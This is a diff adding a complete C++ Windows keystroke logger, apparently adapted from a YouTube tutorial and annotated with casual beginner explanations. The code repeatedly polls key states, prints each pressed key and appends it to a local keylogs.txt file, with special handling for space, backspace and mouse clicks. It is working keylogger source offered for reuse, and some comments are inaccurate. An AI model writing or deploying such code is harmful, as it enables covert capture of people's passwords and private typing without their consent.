@@ -1,0 +1,81 @@
+//Keystroke logger by Zer0Mem0ry on youtube
+//additional comments and modifications made by LMXAB3KS
+//feel free to remove any comments that u want
+#include <Windows.h> //need this for LPCSTR and other stuff
+#include <iostream> //io stream needed to access functions in C++
+#include <fstream>
+#include <stdio.h> //to access older functions in c++
+#include <string> //so that you dont have to use 
+
+using namespace std;
+
+void WriteToLog(LPCSTR text){ //LPCSTR argument for converting a string into LV_ structure. LP stands for long pointer basically you should know u need it for converting string (std::string) to lpcstr
+    ofstream logfile; // Output file stream to perform i/o operations to said file. 
+    logfile.open("keylogs.txt", fstream::app); //opens file called keylogs.txt and appends values to it (App here stands for append mode.)
+    logfile << text; //writes the argument text to it.
+    logfile.close(); //closes logfile the TEXT will come from one of the cases from the switch case thing
+}
+bool KeyIsListed(int ikey){
+    //SWITCH CASE checking what case should be used
+    switch(ikey)
+    {
+    case VK_SPACE:
+        cout << " "; //so for example over here VK_SPACE is used to check for the space character which is " "and if it does exist call the writetolog function and append it.
+        WriteToLog(" ");
+        break;
+    case VK_RETURN:
+        cout << "\n";
+        WriteToLog(" ");
+        break;
+    case VK_SHIFT:
+        cout << " *Shift* "; //dunno what escape sequence operator can be used for shift so i used this instead
+        break;
+    case VK_BACK:
+        cout << "\b";
+        WriteToLog("\b"); // \b stimulates back key pressed.
+        break;
+    case VK_RBUTTON:
+        cout << " *rclick* ";
+        WriteToLog(" *rclick* ");
+        break;
+     case VK_LBUTTON:
+        cout << " *lclick* ";
+        WriteToLog(" *lclick* ");
+        break;
+    default: return false; //if neither of the cases hold true, return false 
+
+    }
+}
+int main()
+{   
+    unsigned char key; //range of unsigned char is 0 till 255 so i used it instead.
+    while(TRUE)
+    {
+        Sleep(10);
+        for (key = 8; key <= 190; key++) //sleep for 10 seconds and slowly increment key from 8 to 190. 
+            if (GetAsyncKeyState(key) == -32767){  // -32767 = min value of a 16-bit signed integer. checks for 3 things: key currently being held doww, key tht has just went from released 2 pressed, other bits in GetAsyncKeyState are 0 (MAY OR MAY NOT ALWAYS BE TRUE)
+                                                        //IMPORTANT: READ REMARK SECTION OF BELOW LINK
+                                                        //also if ur still confused read this https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate?redirectedfrom=MSDN
+                if(KeyIsListed(key)== FALSE){
+                    cout << key;    //PRINTS VALUE OF KEY to console aka the key being pressed
+                    ofstream logfile; 
+                    logfile.open("keylogs.txt", fstream::app); //open and append the key to file with append mode
+                    logfile << key; 
+                    logfile.close(); //close file after appending to finish write operations  
+                }
+            }
+    }
+    return 0;
+    
+}
+
+//other stuff you should know if u arent good with c++
+//fstream is basically one of file handling methods in c++
+//this  class is obtained from fstreambase and from the corresponding iostream class. 
+//this class are designed in a way that they are able to manage the disk files, announced in fstream, and so this file must be included in any program that uses files.
+//confused? read this: https://www.geeksforgeeks.org/std-fstream-close-in-cpp/
+//also geeksforgeeks is a good place to learn.
+
+//also i prolly forgot to explain other shit.
+//if u think i need to explain something important pls tell me in the issues tab thanks
+//s
